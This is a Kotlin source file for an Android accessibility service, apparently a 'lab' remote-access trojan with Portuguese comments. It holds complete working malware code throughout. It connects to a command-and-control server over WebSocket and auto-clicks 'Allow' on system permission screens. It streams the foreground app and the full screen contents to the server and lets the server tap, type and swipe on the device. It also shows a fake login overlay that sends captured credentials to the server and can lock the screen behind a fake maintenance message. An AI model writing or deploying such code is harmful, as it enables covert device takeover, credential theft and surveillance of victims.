package com.labredteam.devicesecurityverifier

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.gson.Gson
import okhttp3.*
import java.util.concurrent.TimeUnit

class LabAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "LabRAT"
        // ⚠️ ALTERE PARA O IP DO SEU SERVIDOR C2 AQUI
        private const val C2_URL = "ws://172.16.84.152:8765"
        
        // Palavras-chave para auto-clique em permissões (PT e EN)
        private val GRANT_KEYWORDS = listOf(
            "Permitir", "Allow", 
            "Durante o uso do app", "While using the app",
            "Apenas esta vez", "Only this time",
            "Ativar", "Enable",
            "OK", "Concordar", "Accept"
        )
    }

    private var webSocket: WebSocket? = null
    private val gson = Gson()
    private val deviceId = "android_lab_${Build.MODEL}_${System.currentTimeMillis() % 10000}"
    private var currentForegroundPackage: String? = null

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "LabAccessibilityService: onCreate")
    }

    override fun onServiceConnected() {
        try {
            super.onServiceConnected()
            Log.i(TAG, "=== SERVIÇO DE ACESSIBILIDADE INICIADO ===")
            OverlayManager.hideGuide()
            connectToC2()
        } catch (e: Exception) {
            Log.e(TAG, "Erro no onServiceConnected: ${e.message}")
        }
    }

    private fun connectToC2() {
        try {
            if (C2_URL.contains("SEU_IP_AQUI")) {
                Log.e(TAG, "ERRO: O IP do servidor C2 não foi configurado")
                return
            }

            val client = OkHttpClient.Builder()
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .retryOnConnectionFailure(true)
                .build()

            val request = Request.Builder().url(C2_URL).build()

            webSocket = client.newWebSocket(request, object : WebSocketListener() {
                override fun onOpen(webSocket: WebSocket, response: Response) {
                    Log.i(TAG, "Conectado ao servidor C2")
                    sendToC2("register", mapOf(
                        "device_id" to deviceId,
                        "model" to Build.MODEL,
                        "android_version" to Build.VERSION.RELEASE
                    ))
                }

                override fun onMessage(webSocket: WebSocket, text: String) {
                    try {
                        val command = gson.fromJson(text, Map::class.java)
                        handleCommand(command)
                    } catch (e: Exception) {
                        Log.e(TAG, "Erro ao processar comando: ${e.message}")
                    }
                }

                override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                    Log.e(TAG, "Falha na conexão: ${t.message}. Tentando reconectar em 10s...")
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        connectToC2()
                    }, 10000)
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Erro fatal ao iniciar conexão: ${e.message}")
        }
    }

    private fun handleCommand(cmd: Map<*, *>) {
        val action = (cmd["action"] ?: cmd["cmd"]) as? String
        Log.i(TAG, "Comando recebido: $action")

        when (action) {
            "get_ui_tree" -> {
                val root = rootInActiveWindow
                if (root != null) {
                    val tree = serializeNode(root)
                    sendToC2("ui_tree", mapOf("tree" to tree))
                    root.safeRecycle()
                }
            }
            "click_text", "perform_click_text" -> {
                val target = (cmd["text"] ?: cmd["target"]) as? String
                if (target != null) {
                    val root = rootInActiveWindow
                    val success = findAndClickRecursive(root, target)
                    sendToC2("action_result", mapOf("action" to "click", "target" to target, "success" to success))
                    root?.safeRecycle()
                }
            }
            "get_foreground_app" -> {
                sendToC2("current_foreground", mapOf("package" to currentForegroundPackage))
            }
            "global_action" -> {
                val type = cmd["type"] as? String
                when (type) {
                    "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                    "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                    "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                    "notifications" -> performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
                }
            }
            "lock_screen" -> {
                val msg = cmd["message"] as? String ?: "Sistema em Manutenção"
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    OverlayManager.showOverlay(applicationContext, R.layout.overlay_guide, msg, true)
                }
            }
            "hide_overlay" -> {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    OverlayManager.hideOverlay()
                }
            }
            "show_login_overlay" -> {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    OverlayManager.showOverlay(applicationContext, R.layout.overlay_login, isFullBlock = true) { data ->
                        sendToC2("captured_data", data)
                    }
                }
            }
            "write_text" -> {
                val target = cmd["target"] as? String
                val text = cmd["text"] as? String
                if (target != null && text != null) {
                    val root = rootInActiveWindow
                    val success = findAndWriteText(root, target, text)
                    sendToC2("action_result", mapOf("action" to "write_text", "target" to target, "success" to success))
                    root?.safeRecycle()
                }
            }
            "scroll" -> {
                val direction = cmd["direction"] as? String ?: "down"
                val root = rootInActiveWindow
                val success = performScroll(root, direction)
                sendToC2("action_result", mapOf("action" to "scroll", "direction" to direction, "success" to success))
                root?.safeRecycle()
            }
            "click_id" -> {
                val id = cmd["id"] as? String
                if (id != null) {
                    val root = rootInActiveWindow
                    val success = findAndClickById(root, id)
                    sendToC2("action_result", mapOf("action" to "click_id", "id" to id, "success" to success))
                    root?.safeRecycle()
                }
            }
            "swipe" -> {
                val x1 = (cmd["x1"] as? Number)?.toFloat() ?: 0f
                val y1 = (cmd["y1"] as? Number)?.toFloat() ?: 0f
                val x2 = (cmd["x2"] as? Number)?.toFloat() ?: 0f
                val y2 = (cmd["y2"] as? Number)?.toFloat() ?: 0f
                val duration = (cmd["duration"] as? Number)?.toLong() ?: 500L
                val success = performSwipe(x1, y1, x2, y2, duration)
                sendToC2("action_result", mapOf("action" to "swipe", "success" to success))
            }
        }
    }

    private fun findAndWriteText(node: AccessibilityNodeInfo?, target: String, text: String): Boolean {
        if (node == null) return false
        
        val nodeText = node.text?.toString() ?: ""
        val nodeId = node.viewIdResourceName ?: ""
        val nodeHint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) node.hintText?.toString() ?: "" else ""

        if (nodeText.contains(target, true) || nodeId.contains(target, true) || nodeHint.contains(target, true)) {
            if (node.isEditable) {
                val arguments = Bundle()
                arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (findAndWriteText(child, target, text)) {
                child.safeRecycle()
                return true
            }
            child.safeRecycle()
        }
        return false
    }

    private fun performScroll(node: AccessibilityNodeInfo?, direction: String): Boolean {
        if (node == null) return false
        
        if (node.isScrollable) {
            val action = if (direction == "down") AccessibilityNodeInfo.ACTION_SCROLL_FORWARD else AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
            return node.performAction(action)
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (performScroll(child, direction)) {
                child.safeRecycle()
                return true
            }
            child.safeRecycle()
        }
        return false
    }

    private fun findAndClickById(node: AccessibilityNodeInfo?, targetId: String): Boolean {
        if (node == null) return false
        
        if (node.viewIdResourceName == targetId) {
            if (node.isClickable) return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            
            var parent = node.parent
            while (parent != null) {
                if (parent.isClickable) {
                    val res = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    parent.safeRecycle()
                    return res
                }
                val old = parent
                parent = parent.parent
                old.safeRecycle()
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (findAndClickById(child, targetId)) {
                child.safeRecycle()
                return true
            }
            child.safeRecycle()
        }
        return false
    }

    private fun performSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false
        
        val path = android.graphics.Path()
        path.moveTo(x1, y1)
        path.lineTo(x2, y2)
        
        val builder = android.accessibilityservice.GestureDescription.Builder()
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, duration))
        
        return dispatchGesture(builder.build(), null, null)
    }

    private fun sendToC2(type: String, data: Any) {
        val payload = mapOf(
            "type" to type,
            "device_id" to deviceId,
            "data" to data,
            "timestamp" to System.currentTimeMillis(),
            "package" to currentForegroundPackage
        )
        webSocket?.send(gson.toJson(payload))
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                
                val pkgName = event.packageName?.toString()
                if (pkgName != null && pkgName != currentForegroundPackage) {
                    currentForegroundPackage = pkgName
                    sendToC2("foreground_app", mapOf("package" to pkgName))
                }

                // Lógica de Auto-Concessão de Permissões
                autoGrantPermissions(pkgName)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro no onAccessibilityEvent: ${e.message}")
        }
    }

    private fun autoGrantPermissions(pkgName: String?) {
        // Focamos em pacotes de sistema que lidam com permissões e configurações
        val permissionPackages = listOf(
            "com.android.permissioncontroller",
            "com.google.android.permissioncontroller",
            "com.android.settings",
            "com.samsung.android.sm_cn" // Exemplo Samsung
        )

        if (pkgName in permissionPackages || pkgName == null) {
            val root = rootInActiveWindow ?: return
            for (keyword in GRANT_KEYWORDS) {
                if (findAndClickRecursive(root, keyword)) {
                    Log.i(TAG, "Auto-concessão: Clicado em '$keyword'")
                    break // Clica em um por vez para evitar loops
                }
            }
            root.safeRecycle()
        }
    }

    private fun serializeNode(node: AccessibilityNodeInfo?, depth: Int = 0): Map<String, Any?> {
        val map = mutableMapOf<String, Any?>()
        if (node == null || depth > 20) return map

        map["text"] = node.text?.toString() ?: ""
        map["class"] = node.className?.toString() ?: ""
        map["content_desc"] = node.contentDescription?.toString() ?: ""
        map["id"] = node.viewIdResourceName ?: ""
        map["clickable"] = node.isClickable
        map["bounds"] = node.let {
            val rect = android.graphics.Rect()
            it.getBoundsInScreen(rect)
            "${rect.left},${rect.top},${rect.right},${rect.bottom}"
        }

        val children = mutableListOf<Map<String, Any?>>()
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                children.add(serializeNode(child, depth + 1))
                child.safeRecycle()
            }
        }
        if (children.isNotEmpty()) map["children"] = children

        return map
    }

    private fun findAndClickRecursive(node: AccessibilityNodeInfo?, target: String): Boolean {
        if (node == null) return false

        val text = node.text?.toString() ?: ""
        val desc = node.contentDescription?.toString() ?: ""

        if (text.equals(target, ignoreCase = true) || desc.equals(target, ignoreCase = true)) {
            if (node.isClickable) {
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            } else {
                var parent = node.parent
                while (parent != null) {
                    if (parent.isClickable) {
                        val result = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        parent.safeRecycle()
                        return result
                    }
                    val oldParent = parent
                    parent = parent.parent
                    oldParent.safeRecycle()
                }
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (findAndClickRecursive(child, target)) {
                child.safeRecycle()
                return true
            }
            child.safeRecycle()
        }
        return false
    }

    private fun AccessibilityNodeInfo?.safeRecycle() {
        if (this != null && Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            @Suppress("DEPRECATION")
            this.recycle()
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        webSocket?.close(1000, "Serviço finalizado")
    }
}
